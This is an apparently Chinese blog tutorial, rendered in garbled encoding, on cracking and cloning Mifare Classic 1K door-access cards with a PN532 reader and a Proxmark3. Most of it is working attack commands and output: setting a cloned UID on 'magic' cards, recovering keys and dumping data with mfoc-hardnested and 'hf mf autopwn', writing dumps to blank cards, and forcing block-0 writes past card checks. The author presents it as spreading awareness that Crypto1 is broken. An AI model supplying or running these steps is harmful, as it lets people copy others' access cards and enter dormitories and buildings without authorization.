CRYPTO1: Èó®Á¶ÅÂç°Á†¥Ëß£ (Proxmark, PN532)
==================================


> 2015 Âπ¥ Crypto1 Ë¢´ÂÆ£Â∏ÉÁêÜËÆ∫Ê≠ª‰∫°ÔºåËøôÁØáÊñáÁ´†ÁêÜËÆ∫Â∫îÁî®ÂÆûË∑µÔºå‰ªãÁªçÂ¶Ç‰ΩïÁ†¥Ëß£Èó®Á¶ÅÂç°„ÄÇ

‰πãÂâç‰∏ÄÁØáÊñáÁ´†‰ªãÁªç‰∫Ü Crypto1 Âä†ÂØÜÁÆóÊ≥ïÔºåÊòØÂ¶Ç‰ΩïË¢´‰∫∫ÈÄÜÂêëÂ∑•Á®ãÔºåÂπ∂ÂÖ¨ÂºÄ‰∫ÜÁÆóÊ≥ïÁªÜËäÇÔºåÈöèÂêé‰ªéËÆ§ËØÅÊñπÂºè (Authentication) Âà∞ Ê†∏ÂøÉÁÆóÊ≥ï (Crypto1) ÂÖ®ÈÉ®Ë¢´Á†¥Ëß£ÔºåÊúÄÁªàÂú® 2015 Âπ¥‰ΩøÁî® Crypto1 Âä†ÂØÜÁÆóÊ≥ïÁöÑ NXP Mifare Classic Âç° (M1 Âç°) ËøéÊù•‰∫ÜÁêÜËÆ∫‰∏äÁöÑÊ≠ª‰∫°„ÄÇ

- [CRYPTO1: ÂØÜÁ†ÅÂàÜÊûêÂ≠¶ (Èó®Á¶ÅÂç°Á†¥Ëß£)](https://zhuanlan.zhihu.com/p/465900396)
 
![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/mifare.png)

ÁÑ∂ËÄåÂÆûÈôÖ‰∏äÔºåCrypto1 Âπ∂Ê≤°ÊúâÂÆåÁªìÔºåÁõ¥Âà∞ 2023 Âπ¥ÔºåM1 Âç°ËøòÂú®ÂõΩÂÜÖÂ§ñÂ§ßÈáè‰ΩøÁî®„ÄÇ‰æãÂ¶Ç‰ªéÂõΩÂÜÖÁ°ïÂ£´ÂÆøËàçÔºåÂà∞Ëã±ÂõΩÂçöÂ£´ÁöÑÂ≠¶ÁîüÂÆøËàçÔºåÈÉΩÂèØ‰ª•ËΩªÊùæÂú∞Â§çÂà∂Èó®Á¶ÅÂç°„ÄÇ

Êàë‰∏çÁ¶ÅÂú®ÊÉ≥ÔºåÂèØËÉΩÁü•ÈÅì Crypto1 Ë¢´Á†¥Ëß£ÁöÑ‰∫∫ÔºåËøò‰∏çÂ§üÂ§ö„ÄÇ

> ËøôÁØáÊñáÁ´†Â∞±ËÆ©Áü•ÈÅìÁöÑ‰∫∫ÔºåË∂äÊù•Ë∂äÂ§ö„ÄÇ

## 1. NFC Âç°ÈÄâÊã©

È¶ñÂÖàÔºåÊàë‰ª¨ÈúÄË¶ÅÈâ¥ÂÆöËá™Â∑±ÁöÑ NFC Âç°ÊòØ‰∏çÊòØÂèØ‰ª•Á†¥Ëß£ÁöÑÔºåÊØïÁ´üË∂äÊù•Ë∂äÂ§öÁöÑÂ≠¶Ê†°„ÄÅÂÖ¨Âè∏ÂºÄÂßãÁî®Êõ¥ÂÆâÂÖ®ÁöÑÂç°„ÄÇ

Êàë‰ª¨ÂÖàÁ°ÆÂÆöÈó®Á¶ÅÂç°ÁöÑÈ¢ëÁéáÔºåÂ¶ÇÊûúÊääÂç°ÊîæÂú®ÊîØÊåÅ NFC ÁöÑÊâãÊú∫ËÉåÂêéÔºåÊâãÊú∫ÊúâÂìçÂ∫îÁöÑËØùÔºåËØ¥ÊòéËøôÂº†Âç°ÊòØÂ∏∏ËßÅÁöÑ 13.56MHzÔºåÊúâË¢´Á†¥Ëß£ÁöÑÂèØËÉΩ„ÄÇ

> Â¶ÇÊûúÊ≤°ÊúâÂìçÂ∫îÔºåÈÇ£‰πàÂèØ‰ª•ÂÖ≥ÊéâÊµèËßàÂô®ÂéªÁé©ËÄç‰∫Ü„ÄÇ

Èô§‰∫ÜÂ∏∏ËßÅÁöÑ 13.56MHz È´òÈ¢ëÔºåËøòÊúâ‰∏Ä‰∫õËÄÅÊóßÁöÑÂ≠¶Ê†°Â§ßÊ•ºÈó®Á¶ÅÁî®ÁöÑÊòØ 125kHz ‰ΩéÈ¢ëÔºå‰æãÂ¶ÇÂçéÁßëÊõæÁªèÁöÑÂä®ÂäõÊ•ºÁ≠âÔºåËøôÁßç‰ΩéÈ¢ëÂç°‰πüÊòØÂèØ‰ª•ËΩªÊòìÂ§çÂà∂ÁöÑ„ÄÇ

‰∏∫‰∫ÜËøõ‰∏ÄÊ≠•Á°ÆËÆ§Âç°ÁöÑÂûãÂè∑ÔºåÊàë‰ª¨ÂèØ‰ª•Âú®ÊîØÊåÅ NFC ÁöÑÊâãÊú∫‰∏äÂÆâË£Ö NFC ToolsÔºåËØªÂèñË¶ÅÂ§çÂà∂ÁöÑÂç°ÁâáÂûãÂè∑„ÄÇ

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/nfc_tools.png)

ÊØîÂ¶ÇÔºåËøôÂº†Âç°Ë¢´ËØÜÂà´‰∏∫ËÑÜÂº±ÁöÑ NXP - Mifare Classic 1k„ÄÇ

> Â¶ÇÊûú‰∏çÊòØËøô‰∏™ÂûãÂè∑Ôºå‰πüÂèØ‰ª•ÂÖ≥ÊéâÊµèËßàÂô®ÂéªÁé©ËÄç‰∫Ü„ÄÇ

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/m1.png)

**Âè¶Â§ñÔºåÈúÄË¶ÅÁ°ÆËÆ§Âç°ÁöÑ ID (Serial Number) ÊòØ 4 ‰ΩçÁöÑ**ÔºåÊØîÂ¶ÇÊúâÁöÑÂç°ÊòØ 7 ‰ΩçÁöÑÔºåÂ∞±Âú®ÊöóÁ§∫‰Ω†ÂÖ≥ÊéâÊµèËßàÂô®ÂéªÁé©ËÄç„ÄÇ

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/m1-7.png)

Â¶ÇÊûú‰Ω†Êâã‰∏äËøôÂº†Âç°‰∏çÂπ∏ÊòØ NXP - Mifare Classic 1kÔºå‰ª•ÂèäÊúâ 4 ‰ΩçÁöÑ IDÔºåÈÇ£‰πàËØ∑‰∏çË¶ÅÂÖ≥Èó≠ÊµèËßàÂô®„ÄÇ



## 2. Á°¨‰ª∂Ë¥≠‰π∞

Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶Å‰∏ãÈù¢ÁöÑÁ°¨‰ª∂ (‰∏ÄËà¨Ê∑òÂÆù 20 ÂåÖÈÇÆ)Ôºö

- PN532 Ê®°ÂùóÔºöÁî®Êù•ÂíåÂç°ÁâáÈÄö‰ø°ÔºåËØªÂèñÂç°ÁâáÊï∞ÊçÆÔºõ
- USB-TTLÔºöÊää PN532 Âíå ÁîµËÑë Áî®‰∏≤Âè£ÈÄö‰ø°ËøûÊé•Ëµ∑Êù•„ÄÇ
- ‰∏ÄÂº†Á©∫ÁôΩÂç°Áî®Êù•Â§çÂà∂ (UIDÔºåCUID)„ÄÇ

‰∏ÄÂº†Èó®Á¶ÅÂç°ÈáåÈù¢ÔºåÂ≠òÂÇ®‰∫ÜÂç°ÁöÑ ID Âíå Êï∞ÊçÆ„ÄÇ**Â¶ÇÊûúË¶ÅÂ§çÂà∂‰∏ÄÂº†Âç°ÔºåÂ∞±Ë¶ÅÂêåÊó∂Â§çÂà∂ ID ÂíåÊï∞ÊçÆ**Ôºå‰ΩÜÊòØÂêàÊ≥ïÁöÑÂç°Áâá ID ÊòØ‰∏çËÉΩ‰øÆÊîπÁöÑÔºåÊâÄ‰ª•‰∏çÂêàÊ≥ïÁöÑ‰∏≠ÂõΩÂéÇÂÆ∂ÈÄ†Âá∫‰∫ÜÂèØ‰ª•‰øÆÊîπ ID ÁöÑÂç°ÔºåÁïô‰∫Ü‰∏Ä‰∫õÈÄö‰ø°ÂêéÈó®„ÄÇ

- **Á¨¨‰∏Ä‰ª£‰∏çÂêàÊ≥ïÁöÑÂç°ÁâáË¢´Áß∞‰∏∫ UID Âç°**ÔºåÂÆÉ‰ª¨ÊúâÁâπÊÆäÁöÑÂêéÈó®Êåá‰ª§ÔºåÁî®Êù•‰øÆÊîπÂç°ÁâáÁöÑ ID„ÄÇ‰∫éÊòØ‰∏Ä‰∫õÈó®Á¶ÅÁ≥ªÁªü‰∏∫‰∫ÜÈò≤ËåÉ‰∏çÂêàÊ≥ïÁöÑÂç°Ôºå‰ºöÊïÖÊÑèÂêëÂç°ÁâáÂèëÈÄÅÂêéÈó®Êåá‰ª§ÔºåÂè™Ë¶ÅÂç°ÁâáÂìçÂ∫î‰∫ÜÔºåËØ¥ÊòéÂÆÉ‰∏çÂêàÊ≥ïÔºåÊãíÁªùÂºÄÈó®„ÄÇ
- **Á¨¨‰∫å‰ª£ÁöÑÈùûÊ≥ïÂç°ÁâáÔºåË¢´Áß∞‰∏∫ CUID Âç°**„ÄÇÂÆÉ‰ª¨‰∏çÈÄöËøáÂêéÈó®‰øÆÊîπ IDÔºå‰∏ç‰ºöÂìçÂ∫îÂêéÈó®Êåá‰ª§ÔºåËÄåÊòØÈÄöËøáÊ≠£Â∏∏ÁöÑÊåá‰ª§Ôºå‰øÆÊîπÂéüÊú¨‰∏çËÉΩ‰øÆÊîπÁöÑ IDÔºåÊâÄ‰ª•‰∏çÂÆπÊòìË¢´Èó®Á¶ÅÁ≥ªÁªüÂØüËßâ„ÄÇ

> Â¶ÇÊûú‰Ω†ÂØπ NFC ‰∏çÂ§™ÁÜüÊÇâÔºåÂ∞±Âè™‰π∞ UID Âç°ÔºõÂ¶ÇÊûúÂ§çÂà∂ÂÆå‰∏çËÉΩÁî®ÔºåÂÜç‰π∞ CUID Âç°„ÄÇ

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/pn532.png)

> ‰∏çÂπ∏ÁöÑÊòØÔºåÊØïÁ´ü‰π∞ÁöÑÊòØÈùûÊ≥ïÁöÑ NFC Âç°ÔºåÂ∫óÂÆ∂‰πüÂèØËÉΩ‰ºöÈùûÊ≥ïÈöèÊú∫ÂèëË¥ß„ÄÇ

ÊØîÂ¶ÇÔºå**ÊàëÊõæÁªè‰π∞‰∫Ü 10 Âº†Á¨¨‰∫å‰ª£ CUID Âç°ÔºåÁªìÊûúÊî∂Âà∞‰∫Ü 4 Âº† 125Khz ÁöÑ‰ΩéÈ¢ëÂç°Ôºå4 Âº† CUID Âç°ÔºåÂíå 2 Âº† UID Âç°**„ÄÇÊâÄ‰ª•Êàë‰ª¨Âú®Êî∂Âà∞Âç°ÁâáÂêéÔºåÈúÄË¶ÅÁ°ÆËÆ§‰∏Ä‰∏ãÂç°ÁâáÁöÑÂûãÂè∑„ÄÇ



## 3. PN532 Á†¥Ëß£

ÂêåÊ†∑ÔºåÊàë‰ª¨ÂèØ‰ª•ÂÖàÁî®ÊîØÊåÅ NFC ÁöÑÊâãÊú∫ÔºåËØªÂèñÂç°ÁâáÂûãÂè∑ÔºåÊ≤°ÊúâÂìçÂ∫îÁöÑÂèØËÉΩÂ∞±ÊòØ 125kHz ‰ΩéÈ¢ëÂç°„ÄÇ

Âú®Á≠õÈÄâÊéâ‰ΩéÈ¢ëÂç°ÂêéÔºåÊàë‰ª¨Ëøõ‰∏ÄÊ≠•Á°ÆËÆ§Âç°ÁâáÊòØÊúâÂêéÈó®ÁöÑ‰∏Ä‰ª£ UID Âç°ÔºåËøòÊòØÊ≤°ÊúâÂêéÈó®ÁöÑ‰∫å‰ª£ CUID Âç°„ÄÇ

### 3.1 libnfc ÂÆâË£Ö

Êàë‰ª¨Êää PN532 ËøûÊé•Âà∞ÁîµËÑëÂêéÔºåÂú® Ubuntu ‰∏ãÂÆâË£Ö libnfcÔºö

```
$ sudo apt install libnfc-dev libnfc-bin libnfc-examples libnfc-pn53x-examples
```

Êé•‰∏ãÊù•‰øÆÊîπ libnfc ÁöÑÈÖçÁΩÆÊñá‰ª∂ `/etc/nfc/libnfc.conf`ÔºåÂú®ÊúÄÂêé‰∏ÄË°åÂä†‰∏ä PN532 ÂíåÁîµËÑëÈÄö‰ø°ÁöÑ‰∏≤Âè£Ôºö 

```
$ sudo vim /etc/nfc/libnfc.conf

    device.name = "pn532"
    device.connstring = "pn532_uart:/dev/ttyUSB0"
```

Êàë‰ª¨ÊääÂç°ÁâáÊîæÂú® PN532 ‰∏äÔºåÂ∞±ÂèØ‰ª• sudo nfc-listËØªÂèñÂç°ÁâáÁöÑ‰ø°ÊÅØ‰∫ÜÔºö

```
$ sudo nfc-list 
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): 01  02  03  04  
      SAK (SEL_RES): 08  
```

Â¶ÇÊûúËøôÈáåÊ≤°ÊúâËØªÂèñÂà∞Âç°Áâá‰ø°ÊÅØÔºåÂèØ‰ª•Ê£ÄÊü•‰∏ãÂç°ÁâáÊòØ‰∏çÊòØÊ≤°Ë¥¥Á¥ßÊ®°ÂùóÔºåÂÜçÁ°ÆËÆ§ PN532 ÁöÑÊã®Á†ÅÂºÄÂÖ≥ÈÉΩÊòØ OFF„ÄÇ

> PN532 Ê®°ÂùóÊîØÊåÅ ‰∏≤Âè£ (HSU)ÔºåI2CÔºåSPI ÈÄö‰ø°ÔºåÊ®°ÂùóÊ≠£Èù¢Êúâ2‰∏™Êã®Á†ÅÂºÄÂÖ≥ÔºåÈªòËÆ§ÈÉΩÊòØ OFFÔºå‰ª£Ë°®‰∏≤Âè£„ÄÇ

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/pn532_switch.png)

Êàë‰ª¨ÂÖàÂ∞ùËØïÁî®ÂêéÈó®Êåá‰ª§‰øÆÊîπÂç°ÁöÑ ID ‰∏∫ 01 02 03 04ÔºåÂ¶ÇÊûúÈ°∫Âà©‰øÆÊîπÔºåËØ¥ÊòéÊòØÊúâÂêéÈó®ÁöÑÁ¨¨‰∏Ä‰ª£ UIDÔºõÂ¶ÇÊûú‰øÆÊîπÂ§±Ë¥•ÔºåÂ∞±ÊòØÁ¨¨‰∫å‰ª£ CUID„ÄÇ

```
$ sudo nfc-mfsetuid 01020304
$ sudo nfc-list
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): 01  02  03  04  
      SAK (SEL_RES): 08  
```

> ÂΩìÁÑ∂Ôºå‰πüÊúâÂèØËÉΩÂ∫óÂÆ∂ÂêàÊ≥ïÂèëË¥ßÔºåÁªô‰∫Ü‰Ω†‰∏ÄÂº†ÂêàÊ≥ïÁöÑÂç°ÁâáÔºåÊ≤°Êúâ‰øÆÊîπ ID ÂäüËÉΩ„ÄÇ

Â¶ÇÊûúÂâçÈù¢È°∫Âà©‰øÆÊîπ‰∫ÜÁ©∫ÁôΩÂç°ÁöÑ IDÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÊääÈó®Á¶ÅÂç°ÁöÑ ID Â§çÂà∂Âà∞Á©∫ÁôΩÂç°‰∏ä‰∫ÜÔºö

```
# ÊääÈó®Á¶ÅÂç°ÊîæÂà∞ PN532 ‰∏ä
$ sudo nfc-list
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): 11  22  33  44  
      SAK (SEL_RES): 08  

# ÊääÁ©∫ÁôΩÂç°ÊîæÂà∞ PN532 ‰∏ä
# ËÆ∞ÂæóÊää‰∏ãÈù¢ÁöÑ 11223344 ÊõøÊç¢Êàê‰∏äÈù¢ËØªÂá∫Êù•ÁöÑ4‰ΩçID
$ sudo nfc-mfsetuid 11223344
```

**ËøôÊ†∑ÔºåÈùûÊ≥ïÁ©∫ÁôΩÂç°Â∞±Êúâ‰∫ÜÂíå‰Ω†Èó®Á¶ÅÂç°‰∏ÄÊ†∑ÁöÑ IDÔºåÊé•‰∏ãÊù•Â∞±ÊòØÂ§çÂà∂Êï∞ÊçÆ‰∫Ü„ÄÇ**



### 3.2 mfoc-hardnested Á†¥Ëß£

Âà∞ËøôÈáåÔºåÊàë‰ª¨Á°ÆËÆ§‰∫ÜÈùûÊ≥ïÂç°ÁâáÁöÑÂûãÂè∑ÔºåÊé•‰∏ãÊù•Â∞±ÂèØ‰ª•Á†¥Ëß£ÂéüÂßãÂç°Áâá‰∫Ü„ÄÇ

Êàë‰ª¨ÂÖàÂÆâË£Ö mfoc-hardnested„ÄÇ 

```
$ git clone https://github.com/nfc-tools/mfoc-hardnested
$ cd mfoc-hardnested
$ ./configure
$ make && sudo make install
```

**Êé•‰∏ãÊù•ÊääË¶ÅÁ†¥Ëß£ÁöÑÈó®Á¶ÅÂç°ÔºåÊîæÂà∞ PN532 ‰∏äÁ†¥Ëß£Âç°Êï∞ÊçÆÔºö**

```
$ sudo mfoc-hardnested -O mycard.mfd
```

Â•ΩÔºåÁªìÊùü‰∫ÜÔºÅÔºÅ Á†¥Ëß£Âá∫Êù•ÁöÑÂç°ÁâáÊï∞ÊçÆÂú® mycard.mfdÈáåÈù¢„ÄÇ



### 3.3 Â§çÂà∂Âç°Áâá

ÊúÄÂêéÔºåÊàë‰ª¨ÈúÄË¶ÅÊääÂ§çÂà∂Âá∫Êù•ÁöÑÊï∞ÊçÆÔºåÂÜôÂÖ•Âà∞Á©∫ÁôΩÁöÑ UID Âç°ÈáåÈù¢„ÄÇ

```
$ sudo nfc-mfclassic w a mycard.mfd
```

Â•ΩÔºåÂèàÁªìÊùü‰∫ÜÔºÅÔºÅ



### 3.4 ÂÖ∂‰ªñÈóÆÈ¢ò

Â¶ÇÊûú‰∏ÄÂàáÈ°∫Âà©ÔºåÊàë‰ª¨Â∞±Â∑≤Â§çÂà∂ÂÆåÊàê‰∫Ü ID Âíå Êï∞ÊçÆ„ÄÇ

ËøôÈáåÈ°∫‰æø‰∏ÄÊèêÔºåÂ¶ÇÊûú‰∏ãÊ¨°ÊÉ≥Ë¶ÅÂ§çÂà∂‰∏ÄÂº†Êñ∞ÁöÑÂç°ÔºåÈúÄË¶ÅÂëäËØâËΩØ‰ª∂ÂéüÊù•ÁöÑÂç°Êï∞ÊçÆ„ÄÇÂõ†‰∏∫Âêë NFC Âç°ÂÜôÊï∞ÊçÆÔºåÈúÄË¶ÅÁü•ÈÅìÂç°ÁöÑÂØÜÈí• (KeyA / KeyB)ÔºåËÄåÂØÜÈí•Â∞±ÂåÖÂê´Âú®Êï∞ÊçÆÈáå„ÄÇ

```
$ nfc-mfclassic w a new_data.mfd old_data.mfd
```

> ÊúâÁöÑÂç°Â§çÂà∂ÂÆåÂêéÔºåÊéßÂà∂‰ΩçÂèØËÉΩË¢´ÊîπÊàê‰∫ÜÂè™ËØªÔºå‰ªéÊ≠§‰∏çËÉΩ‰øÆÊîπÊï∞ÊçÆ„ÄÇ Â¶ÇÊûúÂØπ NFC ÊéßÂà∂‰Ωç‰∏çÁÜüÔºåÂª∫ËÆÆÂ∞±Áî®Á©∫ÁôΩÂç°Â§çÂà∂„ÄÇ



## 4. Proxmark3 Á†¥Ëß£

> Â¶ÇÊûú‰Ω†Â∑≤ÁªèÈ°∫Âà©Á†¥Ëß£‰∫ÜÔºåÂ∑≤ÁªèÂèØ‰ª•ÂÖ≥ÊéâÊµèËßàÂô®‰∫ÜÔºåÊé•‰∏ãÊù•‰ªãÁªçÁöÑÊòØÂè¶‰∏ÄÁßçÁ†¥Ëß£ÊñπÊ≥ï„ÄÇ

PN532 ÊòØ‰∏ÄÁßç‰ΩéÊàêÊú¨ÁöÑËß£ÂÜ≥ÂäûÊ≥ïÔºåËÄå Proxmark (AVR + FPGA) ÂàôÊòØÈíàÂØπ NFC ÂºÄÂèëËÄÖÁöÑÂ∑•ÂÖ∑ÔºåProxmark ÂèØ‰ª•ËØªÂèñÈ´òÈ¢ëÔºå‰ΩéÈ¢ëÔºåÂêÑÁßçÂûãÂè∑Âç°ÁöÑÊï∞ÊçÆÔºåÁîöËá≥ÂÆÉÊú¨Ë∫´Â∞±ÂèØ‰ª•Ê®°Êãü NFC Âç°ÔºåÊâÄ‰ª•‰ª∑Ê†ºÊØî PN532 È´òÂá∫‰∏çÂ∞ë„ÄÇ

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/proxmark.png)

> Proxmark ÊòØÈíàÂØπÂºÄÂèëËÄÖÁöÑÂ∑•ÂÖ∑ÔºåÊâÄ‰ª•Êé•‰∏ãÊù•‰∏ç‰ºöÊúâÂ§™Â§öÁßëÊôÆÁöÑÂÜÖÂÆπ„ÄÇ



### 4.1 Proxmark 3 ÂÆâË£Ö

Proxmark ÊúâÂæàÂ§öÂûãÂè∑ÔºåËøôÈáåÊàëÁî®ÁöÑÊòØ Proxmark 3„ÄÇ

```
$ git clone https://github.com/RfidResearchGroup/proxmark3
$ cd proxmark3
$ cp Makefile.platform.sample Makefile.platform
$ vim Makefile.platform
    PLATFORM=PM3GENERIC
$ make
```

Êé•‰∏ãÊù• Proxmark ËøûÊé•ÁîµËÑëÔºåÂ∞±ÂèØ‰ª•ÁúãÂà∞ÂêØÂä®‰ø°ÊÅØ:

```
$ sudo ./pm3
[=] Session log /root/.proxmark3/logs/log_20231105180758.txt
[+] loaded from JSON file `/root/.proxmark3/preferences.json`
[=] Using UART port /dev/ttyACM0
[=] Communicating with PM3 over USB-CDC


  8888888b.  888b     d888  .d8888b.   
  888   Y88b 8888b   d8888 d88P  Y88b  
  888    888 88888b.d88888      .d88P  
  888   d88P 888Y88888P888     8888"  
  8888888P"  888 Y888P 888      "Y8b.  
  888        888  Y8P  888 888    888  
  888        888   "   888 Y88b  d88P 
  888        888       888  "Y8888P"    [ ‚òï ]


QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
  [ Proxmark3 RFID instrument ]

    MCU....... AT91SAM7S512 Rev B
    Memory.... 512 KB ( 61% used )

    Client.... Iceman/master/v4.17140-285-g7026fd69f 2023-11-05 18:06:30
    Bootrom... Iceman/master/5ae919d-dirty-suspect 2023-10-18 21:12:50 
    OS........ Iceman/master/5ae919d-dirty-suspect 2023-10-18 21:13:01 
    Target.... PM3 GENERIC

[usb] pm3 --> 
```



### 4.2 Proxmark3 Á†¥Ëß£

Êàë‰ª¨ÂèØ‰ª•ÂÖàÁî® `hf search` Á°Æ‰øùÂç°ÁâáÂèØ‰ª•Ë¢´ËØÜÂà´Âà∞„ÄÇ

```
[usb] pm3 --> hf search
 üïî  Searching for ISO14443-A tag...          
[+]  UID: 01 02 03 04 
[+] ATQA: 00 04
[+]  SAK: 08 [2]
[+] Possible types:
[+]    MIFARE Classic 1K
[=] proprietary non iso14443-4 card found, RATS not supported
[+] Magic capabilities : Gen 1a
[+] Prng detection: weak
[#] Auth error
[?] Hint: try `hf mf` commands
```

Êé•‰∏ãÊù•Â∞±ÂèØ‰ª• `hf mf autopwn` Ëá™Âä®Á†¥Ëß£‰∫ÜÔºö

```
[usb] pm3 --> hf mf autopwn                   
[!] ‚ö†Ô∏è  no known key was supplied, key recovery might fail
[+] loaded 56 keys from hardcoded default array
[=] running strategy 1
[=] Chunk 0.3s | found 32/32 keys (56)
......
[+] Generating binary key file
[+] Found keys have been dumped to /root/hf-mf-01020304-key.bin
[=] --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys where res is 0
[=] transferring keys to simulator memory ( ok )
[=] dumping card content to emulator memory (Cmd Error: 04 can occur)
[=] downloading card content from emulator memory
[+] saved 1024 bytes to binary file /root/hf-mf-01020304-dump.bin
[+] saved to json file /root/hf-mf-01020304-dump.json
[=] autopwn execution time: 2 seconds
```

ÂèØ‰ª•ÁúãÂà∞ÔºåÁ†¥Ëß£Âá∫Êù•ÁöÑÂØÜÈí•ÂíåÊï∞ÊçÆÔºåÂàÜÂà´‰øùÂ≠òÂà∞‰∫Ü hf-mf-01020304-key.bin Âíå hf-mf-01020304-dump.bin„ÄÇ



### 4.3 Proxmark3 Â§çÂà∂

 Êàë‰ª¨ÂèØ‰ª•Â§çÂà∂Á†¥Ëß£Âá∫Êù•ÁöÑÊï∞ÊçÆÂà∞Á©∫ÁôΩÁöÑÂç°Áâá„ÄÇ

```
$ hf mf cload -f hf-mf-01020304-dump.eml
```



### 4.4 Â∏∏ËßÅÈóÆÈ¢ò

 ÁÑ∂ËÄåÂÆûÈôÖÊìç‰ΩúÂèØËÉΩ‰∏ç‰ºöÈÇ£‰πàÈ°∫Âà©Ôºå‰∏ãÈù¢ÊòØÂ∏∏ËßÅÈóÆÈ¢òÁöÑËß£ÂÜ≥ÂäûÊ≥ï„ÄÇ

**[1]** **wupC1 error Can't set magic card block: 0**

ËøôËØ¥ÊòéËøôÂº†Âç°‰∏çÊòØÊúâÂêéÈó®ÁöÑ‰∏Ä‰ª£Âç°Ôºå‰∏çËÉΩÈÄöËøáÂêéÈó®Êåá‰ª§ÂÜôÂÖ•Êï∞ÊçÆÔºåÊàë‰ª¨ÈúÄË¶ÅÁî® hexedit Êü•Áúã hf-mf-01020304-dump.bin Èáå block0 ÁöÑÊï∞ÊçÆÔºåÊâãÂä®ÂÜôÂÖ•„ÄÇ

```
$ hf mf wrbl --force --blk 0 -k FFFFFFFFFFFF -d 010203040408040000004A495256494E
```

**[2]** **BCC0 incorrect, got 0x04, expected 0x00**

‰πãÂâçÊàë‰ª¨ÂèØËÉΩÂÜôÂÖ•‰∫Ü‰∏Ä‰∫õÈîôËØØÁöÑÊï∞ÊçÆÔºåÁ†¥Âùè‰∫ÜÂç°ÁöÑÁªìÊûÑÔºå‰æãÂ¶Ç Block0ÔºåÂØºËá¥ÁªôÂá∫‰∫ÜÈîôËØØÁöÑÂìçÂ∫î„ÄÇ

Proxmark ÈªòËÆ§ÊääËØªÂèñÁöÑÂç°ÁâáÂΩì‰ΩúÊ≠£Â∏∏Âç°ÔºåÊâÄ‰ª•Êî∂Âà∞ÈîôËØØÂìçÂ∫îÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöÂÅúÊ≠¢Êìç‰Ωú„ÄÇ‰ΩÜÊòØÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÈÄâÊã©ÂøΩÁï•Ë≠¶ÂëäÔºåÁªßÁª≠Êìç‰ΩúÊù•‰øÆÂ§çÂç°ÁöÑÊï∞ÊçÆ„ÄÇ

```
$ hf 14a config --bcc ignore
$ hf mf wrbl --force --blk 0 -k FFFFFFFFFFFF -d 010203040408040000004A495256494E
$ hf 14a config --bcc std
```

‰∏ãÈù¢ÈÉΩÊòØÁ±ª‰ººÁöÑÔºåÂøΩÁï•‰∏çÂêåÁöÑË≠¶ÂëäÔºåÊù•‰øÆÂ§çÂç°ÁâáÁöÑÊï∞ÊçÆ„ÄÇ

**[3]** **Card didn't answer to CL2 select all**

```
$ hf 14a config --cl2 skip
$ hf mf cload -f hf-mf-01020304-dump.eml
$ hf 14a config --cl2 std
```

**[4]** **Card doesn't support standard iso14443-3 anticollision**

```
$ hf 14a config --atqa force --bcc ignore --cl2 skip --cl3 skip --rats skip
$ hf mf wrbl --force --blk 0 -k FFFFFFFFFFFF -d 010203040408040000004A495256494E
$ hf 14a config --atqa std --bcc std --cl2 std --cl3 std --rats std
```



## ÊÄªÁªì

Â¶ÇÊûú‰Ω†ÂØπ NFC Âç°ÁöÑÊï∞ÊçÆÁªìÊûÑ (KeyA/ KeyB / Block) ‰∏çÂ§™ÁÜüÊÇâÔºåÁî® PN532 + UID (Á¨¨‰∏Ä‰ª£ÂêéÈó®) ÂèØ‰ª•ÈÅøÂÖçÂæàÂ§öÈóÆÈ¢ò„ÄÇ

ÂΩì PN532 + UID Âç°Êó†Ê≥ïÊàêÂäüÂ§çÂà∂ÁöÑÊó∂ÂÄôÔºåÂ∞±ÂèØ‰ª•ËÄÉËôëÂ∞ùËØïÂºÄÂèëËÄÖÂ∑•ÂÖ∑ Proxmark + CUID (Á¨¨‰∫å‰ª£) Âç°„ÄÇ